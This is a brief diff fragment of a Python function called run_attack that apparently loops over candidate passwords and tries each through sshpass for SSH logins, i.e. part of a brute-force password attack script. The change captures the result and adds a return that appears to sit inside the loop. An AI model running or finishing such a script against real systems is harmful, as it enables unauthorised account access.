@@ -18,7 +18,7 @@ def run_attack():
 
         print(f"Trying: {password}")
 
-        subprocess.run(
+        result =subprocess.run(
             [
                 "sshpass",
                 "-p",
@@ -34,6 +34,8 @@ def run_attack():
             capture_output=True,
             text=True
         )
+
+        return result
 
 
 if __name__ == "__main__":
